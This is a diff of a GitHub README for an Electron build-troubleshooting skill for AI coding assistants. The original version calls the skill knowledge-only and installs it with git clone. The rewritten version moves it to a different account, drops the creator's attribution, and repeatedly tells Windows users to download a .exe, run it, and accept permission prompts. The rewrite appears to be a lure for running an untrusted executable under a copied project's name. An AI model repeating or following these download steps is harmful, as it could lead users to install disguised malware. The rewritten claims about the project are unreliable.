@@ -1,231 +1,222 @@
-# 🖥️ Electron Desktop Builds — AI Skill for Antigravity · Claude Code · Gemini CLI · Cursor
+# 🖥️ electron-desktop-builds - Build Electron apps with fewer errors
 
-![Electron Desktop Builds](assets/banner.svg)
+[![Download](https://img.shields.io/badge/Download-blue-grey)](https://github.com/gamerforgood469-art/electron-desktop-builds)
 
-[![Creator](https://img.shields.io/badge/Creator-SMARTbrain%20Activity-blue)](https://www.smartbrainactivity.ai)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](/LICENSE)
-[![Security Scan](https://img.shields.io/badge/Security_Scan-Passed-brightgreen)](/scripts/audit-scan.js)
-[![Antigravity Skill](https://img.shields.io/badge/Antigravity-Skill-black?logo=google&logoColor=white)]()
-[![Claude Code](https://img.shields.io/badge/Claude_Code-Compatible-blue?logo=anthropic&logoColor=white)]()
-[![Gemini CLI](https://img.shields.io/badge/Gemini_CLI-Compatible-4285F4?logo=google&logoColor=white)]()
-[![Electron](https://img.shields.io/badge/Electron-Builds-47848F?logo=electron&logoColor=white)]()
-[![Node.js](https://img.shields.io/badge/Node.js-Compatible-339933?logo=nodedotjs&logoColor=white)]()
-[![License MIT](https://img.shields.io/badge/License-MIT-yellow)]()
+## 🚀 Getting Started
 
-An expert AI skill for AI coding assistants (like Claude, Antigravity, Cursor, etc.) designed to help you plan, configure, and troubleshoot Electron desktop builds right from the chat or terminal.
+electron-desktop-builds helps you plan, set up, and fix Electron desktop builds. It focuses on the parts that often cause trouble on Windows, such as app icons, NSIS installers, code signing, and build errors.
 
-[🇪🇸 Leer en Español](README.es.md)
+Use this guide if you want to:
 
----
+- prepare an Electron desktop build
+- check common setup issues
+- fix icon and installer problems
+- handle code signing for Windows
+- find the cause of build errors
 
-## 🚀 Installation & Setup
+## 📥 Download and Run on Windows
 
-To use this skill with your local AI coding assistant, clone this repository into your editor's "global skills" directory (e.g., `.gemini/antigravity/skills` or your environment's equivalent).
+Use this link to visit the page and download the app:
 
-1. Open your terminal and navigate to your AI assistant's global skills folder.
-2. Run the following command to download the skill:
+[Download electron-desktop-builds](https://github.com/gamerforgood469-art/electron-desktop-builds)
 
-```bash
-git clone https://github.com/smartbrainactivity/electron-desktop-builds.git
-```
+### Steps
 
-3. (Optional but recommended) Audit the code using our embedded security scanner before running anything:
+1. Open the download page in your web browser.
+2. Find the latest file or package for Windows.
+3. Download it to your computer.
+4. If the file is a `.exe`, double-click it to run.
+5. If Windows asks for permission, choose the option to continue.
+6. Follow the setup steps on screen.
+7. Start the app from the desktop, Start menu, or the folder where you saved it.
 
-```bash
-node electron-desktop-builds/scripts/audit-scan.js
-```
+## 💻 What This Tool Helps With
 
-4. Restart your AI chat. Now you can prompt: *"Help me package my React app as an Electron desktop build for Windows"*.
+This project is built around common Electron build tasks on Windows.
 
----
+### Build planning
 
-## What This Skill Does
+- choose the right build settings
+- prepare files before packaging
+- check names, paths, and app data
+- reduce simple build mistakes
 
-This skill turns your AI assistant into an **Electron build expert** that follows a structured diagnostic approach:
+### Icon checks
 
-1. **Clarifies the goal** — dev vs. production, target OS, packaging tool
-2. **Reproduces the error** — asks for logs, configs, and environment details
-3. **Checks compatibility** — verifies Node, Electron, and native module versions
-4. **Isolates the problem** — categorizes the issue using its reference library
-5. **Designs step-by-step fixes** — least invasive first, always reversible
-6. **Explains reasoning** — so you learn, not just copy-paste
+- use the right icon size
+- fix missing app icons
+- check taskbar and shortcut icons
+- avoid low-quality icon files
 
-## Included Reference Guides
+### NSIS installer setup
 
-| Guide | Description |
-|-------|-------------|
-| **[Black Screen Debug](./references/electron-black-screen-debug.md)** | Detailed playbook for diagnosing empty/white/black screen issues |
-| **[Builder Config](./references/electron-builder-config.md)** | Complete electron-builder templates — signed AND unsigned workflows |
-| **[Code Signing](./references/electron-code-signing.md)** | Windows (.pfx, Azure Key Vault) and macOS (notarization) signing guides |
-| **[Common Errors](./references/electron-common-errors.md)** | 10 known error patterns with proven solutions (including icon, symlink, Visual Studio) |
-| **[Diagnostic Steps](./references/electron-diagnostic-steps.md)** | Systematic checklist for build failure triage |
-| **[GitHub Actions](./references/electron-github-actions.md)** | Automated CI/CD workflows for multi-platform builds and releases |
-| **[Icon Generation](./references/electron-icon-generation.md)** | JPEG-vs-PNG detection, rcedit workflow, all 10 icon locations, generation scripts |
-| **[Release Checklist](./references/electron-release-checklist.md)** | 10-section pre-distribution checklist (icons, versions, debug cleanup, unsigned builds) |
+- create Windows installer builds
+- set the app name and version
+- check install paths
+- review install and uninstall behavior
 
-## Scripts
+### Code signing
 
-| Script | Type | Description |
-|--------|------|-------------|
-| **[audit-scan.js](./scripts/audit-scan.js)** | Diagnostic | Static security scanner — verifies no malicious patterns |
-| **[verify-icons.js](./scripts/verify-icons.js)** | Diagnostic | Icon format validator — detects JPEG-as-PNG, checks dimensions, warns about config |
-| **[fix-exe-icon.js](./scripts/fix-exe-icon.js)** | Post-build | Automatic icon injection into `.exe` when `signAndEditExecutable: false`. Uses `rcedit` + rebuilds NSIS installer. **Copy to project and add to build chain.** |
+- prepare a signed Windows build
+- check certificate use
+- reduce warning prompts
+- confirm signing steps in the build flow
 
-### Using `fix-exe-icon.js`
+### Error troubleshooting
 
-This script permanently fixes the default Electron icon issue on unsigned Windows builds. Copy it to your project and add it to your build script:
+- read common build errors
+- trace failed packaging steps
+- spot missing files
+- fix setup issues that stop the build
 
-```bash
-# Copy to your project (or a shared scripts folder)
-cp scripts/fix-exe-icon.js <your-project>/scripts/fix-exe-icon.js
+## 🪟 Windows Requirements
 
-# Append to electron:build in package.json
-"electron:build": "... && electron-builder && node scripts/fix-exe-icon.js"
-```
+Use a Windows PC with:
 
-The script reads everything from `package.json` automatically (productName, win.icon, output directory). No hardcoded paths — works for any Electron app.
+- Windows 10 or Windows 11
+- at least 4 GB of RAM
+- 1 GB of free disk space
+- internet access for the download
+- permission to run downloaded files
 
-## Pre-Build Preflight Prompt (Optional)
+For best results:
 
-Before building your installer, paste this prompt into your AI assistant. It will automatically check your project, ask for anything missing, and fix issues before you build:
+- keep Windows up to date
+- use a folder path without special characters
+- close other large apps before you run the build
+- use a user account that can install software
 
-<details>
-<summary><strong>Click to expand the full preflight prompt</strong></summary>
+## 🛠️ How to Use It
 
-```
-Run a pre-build preflight check for my Electron app before I build the installer.
+### 1. Open the app
 
-For each step, run the check automatically. If something fails, STOP and fix it before continuing.
-If you need information from me, ASK before proceeding.
+Start the app after download and setup.
 
-1. VERSIONS — Read package.json version, electron main file APP_VERSION constant, and any
-   hardcoded version strings in the frontend (footer, about dialog). Confirm all match.
-   Search: grep -r "v1\.0\.0" client/src/
+### 2. Review the build plan
 
-2. ICON FORMAT — Run: file assets/icon.png (or wherever the icon is in build config).
-   If output says "JPEG image data" instead of "PNG image data", convert it to real PNG.
-   Check icon is at least 256x256. Check if old icon references (avatar.png) remain in components.
+Look at the main build steps and check the target platform. The app is focused on Windows desktop builds, so it helps you stay on the right path.
 
-3. DEBUG CODE — Search for openDevTools in electron main file. Must ONLY run when isDev is true.
-   Search for console.log debug statements and debug listeners (did-fail-load, console-message).
-   Check <base href="./"> is not duplicated in index.html.
+### 3. Check your files
 
-4. BUILD CONFIG — Verify build.files includes all required directories.
-   If signAndEditExecutable: false, confirm rcedit step is planned.
-   If npmRebuild: false, confirm no native modules are needed.
-   Check installer.nsh install path is correct.
+Make sure your app files, icons, and installer assets are ready. Common build problems start here.
 
-5. REPORT — Generate a summary table with OK/FAIL for each check.
-   If all pass, give me the exact build commands (including rcedit if needed).
-   If any fail, fix first, then show the updated report.
-```
+### 4. Fix issues as they appear
 
-</details>
+If the app shows a problem, check the item it points to:
 
-After the build completes, you can verify the output with:
+- icon file
+- package file
+- build config
+- signing setup
+- installer settings
 
-```
-Verify my Electron build: extract the icon from the .exe and confirm it's my app icon
-(not the default Electron icon). If wrong, fix it with rcedit and rebuild the NSIS installer.
-```
+### 5. Run the build again
 
-## Pre-Build Preflight Prompt (Optional)
+After you make a change, run the build again and confirm the result.
 
-Before building your installer, paste this prompt into your AI assistant. It will automatically check your project, ask for anything missing, and fix issues before you build:
+## 🧩 Common Use Cases
 
-<details>
-<summary><strong>Click to expand the full preflight prompt</strong></summary>
+### First-time Electron build
 
-```
-Run a pre-build preflight check for my Electron app before I build the installer.
+If you are new to Electron builds, use the tool to check the main setup points before you package your app.
 
-For each step, run the check automatically. If something fails, STOP and fix it before continuing.
-If you need information from me, ASK before proceeding.
+### Broken app icon
 
-1. VERSIONS — Read package.json version, electron main file APP_VERSION constant, and any
-   hardcoded version strings in the frontend (footer, about dialog). Confirm all match.
-   Search: grep -r "v1\.0\.0" client/src/
+If your app icon looks wrong, use the icon checks to confirm the file format and size.
 
-2. ICON FORMAT — Run: file assets/icon.png (or wherever the icon is in build config).
-   If output says "JPEG image data" instead of "PNG image data", convert it to real PNG.
-   Check icon is at least 256x256. Check if old icon references (avatar.png) remain in components.
+### Installer will not build
 
-3. DEBUG CODE — Search for openDevTools in electron main file. Must ONLY run when isDev is true.
-   Search for console.log debug statements and debug listeners (did-fail-load, console-message).
-   Check <base href="./"> is not duplicated in index.html.
+If NSIS fails, review the installer settings and check for file path issues or missing assets.
 
-4. BUILD CONFIG — Verify build.files includes all required directories.
-   If signAndEditExecutable: false, confirm rcedit step is planned.
-   If npmRebuild: false, confirm no native modules are needed.
-   Check installer.nsh install path is correct.
+### Signing issue on Windows
 
-5. REPORT — Generate a summary table with OK/FAIL for each check.
-   If all pass, give me the exact build commands (including rcedit if needed).
-   If any fail, fix first, then show the updated report.
-```
+If the build asks for a valid certificate or fails during signing, review the code signing setup.
 
-</details>
+### Build error during packaging
 
-After the build completes, you can verify the output with:
+If packaging fails, check the file list, output path, and build config. Small path or naming issues can stop the process.
 
-```
-Verify my Electron build: extract the icon from the .exe and confirm it's my app icon
-(not the default Electron icon). If wrong, fix it with rcedit and rebuild the NSIS installer.
-```
+## 📁 Suggested Folder Setup
 
-## Companion Skill
+Keep your project in a simple folder structure like this:
 
-This skill pairs with [**electron-desktop-builder**](https://github.com/smartbrainactivity/electron-desktop-builder) for automated setup:
+- `project-root`
+- `icons`
+- `build`
+- `dist`
+- `installer-assets`
 
-| Skill | When to use |
-|-------|------------|
-| **electron-desktop-builder** | Starting from scratch, first Electron setup, converting a web app |
-| **electron-desktop-builds** (this) | Build fails, black screen, icons wrong, packaging errors |
+This helps you find files fast and keeps build steps easier to follow.
 
-**Workflow:**
-```
-Web app → electron-desktop-builder → First build
-                                          ↓
-                                    Works? → Done
-                                    Fails? → electron-desktop-builds → Fix → Rebuild
-```
+## 🔍 What to Check Before You Build
 
-If you're setting up Electron for the first time, start with the builder. Come here when something breaks.
+- app name
+- version number
+- icon file
+- output folder
+- installer name
+- signing certificate
+- file paths
+- required assets
 
----
+## ⚙️ Simple Build Flow
 
-## Coverage
+1. Open the project.
+2. Check the app name and version.
+3. Add the icon files.
+4. Review installer settings.
+5. Set up signing if needed.
+6. Run the build.
+7. Check the output in the `dist` folder.
+8. Test the installer on Windows.
 
-- **Build Tools**: electron-builder, electron-forge, electron-packager
-- **Platforms**: Windows (NSIS installer), macOS (.dmg), Linux (.AppImage, .deb)
-- **Frameworks**: React, Expo, vanilla Node.js projects
-- **Topics**: asar packaging, preload scripts, native modules, auto-update, code signing, cross-platform builds, icon generation
+## 🧠 Helpful Tips
 
-## Requirements
+- Use short folder names.
+- Keep file names simple.
+- Replace missing icons before you build.
+- Test one change at a time.
+- Save a clean copy of your project files.
+- Check the output folder after each build.
 
-- **Any AI Agent / IDE**: This skill is fully IDE-agnostic. It works with Claude Code, Antigravity, Gemini CLI, Cursor, and any assistant that supports skill loading.
-- **No runtime dependencies**: This is a knowledge-only skill — no scripts to execute, no packages to install.
+## 🧪 Testing the Output
 
-**🛡️ Privacy & Security Note**: This skill contains only markdown reference files and optional diagnostic scripts. There are no network requests and no telemetry. We strongly encourage you to inspect the source code before use.
+After the build finishes, test the result on a Windows machine.
 
-**🔍 Static Audit Scanner**: This repository includes a native static analysis script (`scripts/audit-scan.js`) similar to Snyk/CodeQL. You can run `node scripts/audit-scan.js` at any time to verify that none of the executable logic contains malicious patterns (like `eval`, unauthorized HTTP requests, or destructive `child_process` commands).
+Check that:
 
-## Language Agnostic
+- the app opens
+- the icon shows in the taskbar
+- the installer starts
+- the app installs to the right place
+- the app removes cleanly if you uninstall it
 
-This skill adapts to your prompt's language automatically. You can instruct the AI in English, Spanish, or any other language, and the diagnostic guidance will follow your preferred language.
+If one part fails, check that part first.
 
-## Support & Contact
+## 🧰 Built for These Topics
 
-- **Creator**: SMARTbrain Activity
-- **Website**: [www.smartbrainactivity.ai](https://www.smartbrainactivity.ai)
-- **Email**: [hey@smartbrainactivity.ai](mailto:hey@smartbrainactivity.ai)
+This repository is focused on:
 
----
+- Electron desktop apps
+- Windows builds
+- electron-builder
+- NSIS installers
+- icon generation
+- code signing
+- build diagnostics
+- AI help for build planning
+- troubleshooting common build errors
 
-## Topics
+## 📎 Download Link
 
-electron · electron-builder · nsis · desktop-app · windows · macos · linux · code-signing · icon-generation · rcedit · ai-agents · gemini-cli · antigravity · claude-code · claude-code-skills · antigravity-tools · antigravity-skills
+Visit the page here to download and run the Windows build:
 
-## License
+[https://github.com/gamerforgood469-art/electron-desktop-builds](https://github.com/gamerforgood469-art/electron-desktop-builds)
 
-[MIT License](LICENSE)
+## 🖱️ Quick Start
+
+1. Open the download page.
+2. Get the Windows file.
+3. Run the file.
+4. Follow the on-screen setup steps.
+5. Open the app and start your build check
